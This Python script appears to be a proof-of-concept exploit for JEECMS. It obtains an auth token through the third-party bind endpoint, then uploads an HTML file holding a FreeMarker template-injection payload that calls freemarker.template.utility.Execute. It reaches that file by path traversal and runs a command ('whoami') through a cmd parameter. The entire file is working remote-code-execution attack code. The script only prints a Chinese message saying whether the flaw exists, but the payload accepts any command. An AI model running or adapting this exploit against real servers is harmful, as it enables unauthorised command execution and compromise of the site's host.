#!/usr/bin/python
# -*- coding:utf-8 -*-
import requests
import sys
import json
import os
import time
import string
import argparse
import readchar
import random
from requests_toolbelt.multipart.encoder import MultipartEncoder

chars = string.ascii_letters
def random_string_generator(str_size, allowed_chars):
    return ''.join(random.choice(allowed_chars) for x in range(str_size))

def getToken(url):
    temp = "/thirdParty/bind"
    target = url+temp
    #print("checking url:" + target)
    headers = {'Content-Type': 'application/json','User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0','Accept-Language':'en-US,en;q=0.5','Accept-Encoding':'gzip, deflate','X-Requested-With':'XMLHttpRequest','Content-Length':'79'}

    data = {"username":random_string_generator(5,chars),"loginWay": 1, "loginType": "QQ", "thirdId": "abcdefg"}

    response = requests.post(url=target,headers=headers,json=data,verify=False)
    if response.status_code ==200:
    #    print("111111")
        null =""
        text =response.text
        obj = json.dumps(text)
        t1 =json.loads(text)
        
        token = t1['data']['JEECMS-Auth-Token']
        print("JEECMS-Auth-Token: "+token)
        return token
    else:
        print("get token error")

def getPath(url,token):
    temp = "/member/upload/o_upload"
    target = url+temp
    shellCode = '''${site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.ObjectWrapper").getField("DEFAULT_WRAPPER").get(null).newInstance(site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.utility.Execute"), null)(cmd)}'''
    headers = {'Content-Type': 'multipart/form-data; boundary=-----------------------------1250178961143214655620108952','User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0','Accept-Language':'en-US,en;q=0.5','Accept-Encoding':'gzip, deflate','X-Requested-With':'XMLHttpRequest','Content-Length':'606','JEECMS-Auth-Token':token}

    multipart_encoder = MultipartEncoder(
        fields={
            "uploadFile": (
            "b.html", shellCode, 'text/html'),
            "typeStr": "File"
        },
        boundary='-----------------------------1250178961143214655620108952'
    )   
    response = requests.post(url=target,headers=headers,data=multipart_encoder,verify=False)

    if response.status_code ==200:
        null =""
        text =response.text
        obj = json.dumps(text)
        t1 =json.loads(text)
        path = t1['data']['fileUrl']
        return path
    else:
        print("get path error")

def verify(target_url):
    token = getToken(url=target_url)
    time.sleep(1)
    path = getPath(target_url,token)
    time.sleep(1)
    path = path.replace("/","-")
    temp ="/..-..-..-..-.."
    url = target_url+temp+path
    print("resultUrl: ",url)
    url = url.replace("html","htm")
    cmdurl  = url+"?cmd=whoami"
    return requests.get(cmdurl,verify=False).text


if __name__=="__main__":
    target = sys.argv[1]
    data = verify(target)
    if data:
        print("[+]漏洞存在，执行 whoami 的结果为：", data)
    else:
        print("[-]漏洞不存在")
